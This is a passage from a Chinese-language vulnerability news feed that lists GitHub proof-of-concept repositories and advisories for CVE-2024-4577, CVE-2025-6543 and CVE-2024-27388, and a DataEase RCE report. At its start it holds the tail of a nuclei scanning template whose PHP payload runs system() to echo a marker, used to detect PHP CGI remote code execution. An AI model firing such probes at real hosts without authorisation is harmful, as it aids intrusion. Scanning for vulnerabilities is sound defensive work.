AppleWebKit<span class="hljs-symbol">/537.36</span><br><br>        <span class="hljs-operator">&lt;</span><span class="hljs-operator">?</span>php\necho &#x27;[START]&#x27;;\nsystem(&#x27;echo CVE-<span class="hljs-number">202</span>4-<span class="hljs-number">457</span>7-TEST&#x27;);\necho &#x27;[END]&#x27;;\ndie();<br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;[START]CVE-2024-4577-TEST[END]&quot;</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> status<br>        <span class="hljs-params">status:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-number">200</span><br><br><span class="hljs-params">variables:</span><br>  <span class="hljs-params">Hostname:</span> <span class="hljs-string">&quot;example.com&quot;</span>  <span class="hljs-comment"># Replace with target hostname or IP.</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; PHP CGI 参数注入远程代码执行漏洞&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;漏洞编</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
    
    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>Citrix Bleed 2 PoC</title>
    <link href="http://example.com/2025/06/30/github_1143863387/"/>
    <id>http://example.com/2025/06/30/github_1143863387/</id>
    <published>2025-06-30T08:15:14.240Z</published>
    <updated>2025-06-30T08:15:14.240Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Citrix Bleed 2 PoC</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-6543</li></ul><p><strong>漏洞类型：</strong> 其他</p><p><strong>漏洞描述：</strong> Citrix Bleed 2 PoC</p><p><strong>产品厂商：</strong> Citrix</p><p><strong>来源：</strong> <a href="https://github.com/seabed-atavism/CVE-2025-6543">https://github.com/seabed-atavism/CVE-2025-6543</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>README.md</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2025-6543"><a href="#CVE-2025-6543" class="headerlink" title="CVE-2025-6543"></a>CVE-2025-6543</h2><p>Citrix Bleed 2 PoC</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Citrix Bleed 2 PoC&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;漏洞编号：</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
    
    <category term="其他" scheme="http://example.com/tags/%E5%85%B6%E4%BB%96/"/>
    
  </entry>
  
  <entry>
    <title>微步情报局再次发现DataEase存在多个高危漏洞，可实现RCE</title>
    <link href="http://example.com/2025/06/30/weixin_329679675/"/>
    <id>http://example.com/2025/06/30/weixin_329679675/</id>
    <published>2025-06-30T08:02:28.797Z</published>
    <updated>2025-06-30T08:02:28.793Z</updated>
    
    <content type="html"><![CDATA[<p><strong>公众号：</strong> 微步在线研究响应中心</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/jdMf3szzY7-N1jqVbPXLiA">https://mp.weixin.qq.com/s/jdMf3szzY7-N1jqVbPXLiA</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 微步在线研究响应中心&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/jdMf3szzY7-N1jqVbPXLiA&quot;&gt;https://mp.weixi</summary>
      
    
    
    
    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
    
    
    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
    
    <category term="微步在线研究响应中心" scheme="http://example.com/tags/%E5%BE%AE%E6%AD%A5%E5%9C%A8%E7%BA%BF%E7%A0%94%E7%A9%B6%E5%93%8D%E5%BA%94%E4%B8%AD%E5%BF%83/"/>
    
  </entry>
  
  <entry>
    <title>Github Poc</title>
    <link href="http://example.com/2025/06/30/github_2825788633/"/>
    <id>http://example.com/2025/06/30/github_2825788633/</id>
    <published>2025-06-30T07:45:12.095Z</published>
    <updated>2025-06-30T07:45:12.096Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> </p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-27388</li></ul><p><strong>来源：</strong> <a href="https://github.com/Mahesh-970/CVE-2024-27388_afterPatch">https://github.com/Mahesh-970/CVE-2024-27388_afterPatch</a></p><p><strong>类型：</strong> CVE-2024:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>.whitesource</li><li>gss_rpc_xdr.c</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="CVE-2024:github search" scheme="http://example.com/tags/CVE-2024-github-search/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2024-27388_beforPatch</title>
    <link href="http://example.com/2025/06/30/github_2761984751/"/>
    <id>http://example.com/2025/06/30/github_2761984751/</id>
    <published>2025-06-30T07:15:13.809Z</published>
    <updated>2025-06-30T07:15:13.806Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> CVE-2024-27388_beforPatch</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-27388</li></ul><p><strong>漏洞类型：</strong> 其他</p><p><strong>来源：</strong> <a href="https://github.com/Mahesh-970/CVE-2024-27388_beforPatch">https://github.com/Mahesh-970/CVE-2024-27388_beforPatch</a></p><p><strong>类型：</strong> CVE-2024:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>.whitesource</li><li>gss_rpc_xdr.c</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; CVE-2024-27388_beforPatch&lt;/p&gt;
&lt;p&gt;&lt;stron</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="CVE-2024:github search" scheme="http://example.com/tags/CVE-2024-github-search/"/>
    
    <category term="其他" scheme="http://example.com/tags/%E5%85%B6%E4%BB%96/"/>
    
  </entry>
  
</feed>
